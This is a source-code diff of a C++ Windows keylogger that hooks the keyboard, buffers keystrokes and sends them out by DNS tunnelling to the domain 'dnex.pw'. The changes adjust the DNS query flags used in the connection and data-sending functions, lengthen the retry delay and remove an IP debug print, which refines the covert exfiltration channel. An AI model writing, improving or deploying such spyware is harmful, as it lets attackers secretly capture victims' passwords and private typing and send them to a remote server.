@@ -1,16 +1,17 @@
 #include <iostream>
 #include <string>
 #include <sstream>
-
 // WinAPI
 #include <iomanip>
 #include <windows.h>
 #include <windns.h>
 #include <winsock.h>
+
 #define MAX_BUFFER 5
 #define DOMAIN "dnex.pw"
 #define MUTEX_NAME "1fc325f3-c548-43db-a13f-8c460dda8381"
 
+const DWORD DNS_OPTIONS = DNS_QUERY_BYPASS_CACHE + DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE;
 HHOOK _k_hook;
 HKL keyboardLayout;
 std::string keystrokeBuffer = "";
@@ -52,14 +53,16 @@ int main(int argc, char* argv[]) {
 	HANDLE mutex = CreateMutex(0, 0, MUTEX_NAME);  // used to check if the program has already started
 	switch (GetLastError()) {
 		case ERROR_ALREADY_EXISTS:  // program already running
-			return 0;
+			return TRUE;
 		case ERROR_SUCCESS:  // program isn't already running
 			break;
 		default:  // start just to be sure.
 			break;
 	}
+	
+	// establish connection
 	while ((connectionId = startConnection(DOMAIN)) == -1) {
-		Sleep(250);  // sleep to prevent spamming
+		Sleep(1000);  // sleep to prevent spamming
 		std::cout << "Failed to establish connection" << std::endl;
 	}
 	std::cout << "Connection ID: " << connectionId << std::endl;
@@ -113,7 +116,7 @@ int startConnection(const char* domain) {
 	PDNS_RECORD pDnsRecord;
 	DNS_STATUS status = DnsQuery_A(pOwnerName,
 								   wType,
-								   DNS_QUERY_BYPASS_CACHE,
+								   DNS_OPTIONS,
 								   NULL,
 								   &pDnsRecord,
 								   NULL);
@@ -123,7 +126,6 @@ int startConnection(const char* domain) {
 		IN_ADDR ipaddr;
 		ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
 		std::string ipStr = inet_ntoa(ipaddr);
-		std::cout << "IP: " << ipStr << std::endl;
 		DnsRecordListFree(pDnsRecord, DNS_FREE_TYPE::DnsFreeRecordList);
 		return std::stoi(ipStr.substr(ipStr.rfind(".") + 1));
 	}
@@ -138,7 +140,7 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 	
 	DNS_STATUS status = DnsQuery_A(pOwnerName,
 								   wType,
-								   DNS_QUERY_BYPASS_CACHE,
+								   DNS_OPTIONS,
 								   NULL,
 								   &pDnsRecord,
 								   NULL);
